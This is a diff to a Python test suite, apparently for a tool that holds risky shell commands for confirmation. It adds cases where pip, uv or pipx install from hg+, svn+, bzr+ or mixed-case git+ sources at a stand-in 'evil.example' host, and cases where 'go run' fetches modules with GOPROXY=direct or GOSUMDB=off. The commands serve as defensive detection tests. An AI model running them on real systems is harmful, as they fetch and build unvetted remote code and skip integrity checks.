@@ -4539,13 +4539,17 @@ class HarmlessStops(unittest.TestCase):
 
     def test_a_mercurial_subversion_or_bazaar_install_is_held_as_a_version_control_source(self):
         """TK-A028 held `git+` installs only, so pip's hg+, svn+ and bzr+ sources (a Mercurial, Subversion or Bazaar
-        checkout it builds) were flagged; a release from the index and a name that holds the letters are still allowed."""
+        checkout it builds) were flagged, as was any scheme in another case (pip lowercases it); a release from the
+        index and a name that holds the letters are still allowed."""
         self.check(
             ["pip install svn-tools", "pip install requests", "pip install hg-git", "pip install bzr"],
             [(f"{prog} install {vcs}+{url}", "ask", "TK-A028") for prog in ("pip", "uv pip", "pipx")
              for vcs, url in (("hg", "https://evil.example/r"), ("svn", "ssh://evil.example/r"),
                               ("bzr", "http://evil.example/r"), ("hg", "static-http://evil.example/r"),
-                              ("bzr", "lp:evil"))])
+                              ("bzr", "lp:evil"))] +
+            [(f"pip install {src}", "ask", "TK-A028") for src in (
+                "GIT+https://evil.example/r", "HG+https://evil.example/r", "git+HTTPS://evil.example/r",
+                "Svn+Ssh://evil.example/r", "BZR+lp:evil", "GIT://evil.example/r", "Git+File:///tmp/r")])
 
     def test_a_go_install_with_go_s_checks_off_is_held_as_a_direct_fetch(self):
         """`go install x@v` comes through Go's module proxy and checksum database, a registry with integrity checks, as
@@ -4579,7 +4583,10 @@ class HarmlessStops(unittest.TestCase):
                 f"GOPROXY=direct go run {m}", f"GOPROXY=off go run -tags x {m}", f"GOSUMDB=off go run {m} arg",
                 f"GOPRIVATE=github.com/evil go run -exec env {m}", f"go run -insecure {m}",
                 f"env GOPROXY=direct go run {m}", f"export GOSUMDB=off; go run {m}",
-                f"go env -w GOPROXY=direct && go run {m}", f"GOPROXY=direct go run -mod=mod {m}")])
+                f"go env -w GOPROXY=direct && go run {m}", f"GOPROXY=direct go run -mod=mod {m}",
+                f"GOPROXY=direct go run -compiler gc {m}",
+                f"GOPROXY=direct go run -buildmode exe {m}", f"GOPROXY=direct go run -buildmode=exe {m}",
+                f"GOPROXY=direct go run --compiler gc {m}")])
 
     def test_a_runner_s_command_is_read_where_a_pipe_reads_one(self):
         """A rule that reads the command after a pipe reads what a runner runs there (shell._lines), hatch's without
